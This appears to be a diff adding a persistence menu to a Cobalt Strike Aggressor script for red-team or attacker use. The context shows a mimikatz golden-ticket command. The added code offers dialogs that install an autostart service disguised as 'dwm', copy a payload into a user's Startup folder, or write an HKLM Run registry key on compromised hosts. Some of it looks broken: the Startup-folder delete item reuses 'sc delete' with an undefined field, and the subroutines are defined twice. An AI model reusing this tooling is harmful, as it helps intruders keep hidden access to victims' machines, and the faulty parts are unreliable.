@@ -45,4 +45,91 @@ menu "权限维持" {
     $krbtgt = $3['krbtgt'];
     bmimikatz($bid, "kerberos::golden /admin:$admin /domain:$domain /sid:$sid /krbtgt:$krbtgt /ptt exit");
   }
+
+  menu "自启动运行" {
+    menu "自启动服务" {
+      item "创建自启动服务" {
+        $bid = $1['@'];
+        $dialog = dialog("创建自启动服务", %(service => "dwm", program => "C:\\Windows\\Temp\\start.exe", bid => $bid), &auto);
+        drow_text($dialog, "service", "创建服务名: ");
+        drow_text($dialog, "program", "程序路径: ");
+        dialog_description($dialog, "添加服务自动运行。");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      sub auto {
+        $service = $3['service'];
+        $program = $3['program'];
+        bshell($bid, "sc create $service binPath= $program start= auto");
+      }
+      item "删除自启动服务" {
+        $bid = $1['@'];
+        $dialog = dialog("删除自启动服务", %(service => "dwm", bid => $bid), &del);
+        drow_text($dialog, "service", "服务名: ");
+        dialog_description($dialog, "删除自启动服务。");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      sub del{
+        $service = $3['service'];
+        bshell($bid, "sc delete $service");
+      }
+    }
+    menu "启动文件夹" {
+      item "复制至启动文件夹" {
+        $bid = $1['@'];
+        $dialog = dialog("复制至启动文件夹", %(program => "C:\\Windows\\Temp\\start.exe", user => "administrator", bid => $bid), &auto);
+        drow_text($dialog, "program", "程序路径: ");
+        drow_text($dialog, "user", "用户名: ");
+        dialog_description($dialog, "复制至启动文件夹。");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      sub auto {
+        $program = $3['program'];
+        $user = $3['user'];
+        bshell($bid, "copy \"$program\" \"C:\\Users\\$user\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"");
+      }
+      item "删除自启动文件夹程序" {
+        $bid = $1['@'];
+        $dialog = dialog("删除自启动服务", %(program => "dwm", bid => $bid), &del);
+        drow_text($dialog, "service", "服务名: ");
+        dialog_description($dialog, "删除自启动服务。");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      sub del{
+        $service = $3['service'];
+        bshell($bid, "sc delete $service");
+      }
+    }
+    menu "添加注册表实现自启动" {
+      item "添加注册表实现自启动" {
+        $bid = $1['@'];
+        $dialog = dialog("添加注册表实现自启动", %(program => "C:\\Windows\\Temp\\start.exe", name =>"start", bid => $bid), &auto);
+        drow_text($dialog, "program", "程序路径: ");
+        drow_text($dialog, "name", "名称: ");
+        dialog_description($dialog, "添加注册表实现自启动。");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      sub auto {
+        $program = $3['program'];
+        $name = $3['name'];
+        bshell($bid, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"$name\" /d \"$program\" /f");
+      }
+      item "删除注册表自启动" {
+        $bid = $1['@'];
+        $dialog = dialog("删除注册表自启动", %(name => "start", bid => $bid), &del);
+        drow_text($dialog, "name", "名称: ");
+        dialog_description($dialog, "删除注册表自启动。");
+        dbutton_action($dialog, "运行");
+        dialog_show($dialog);
+      }
+      sub del{
+        $name = $3['name'];
+        bshell($bid, "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"$name\" /f");
+      }
+    }
+  }
 }
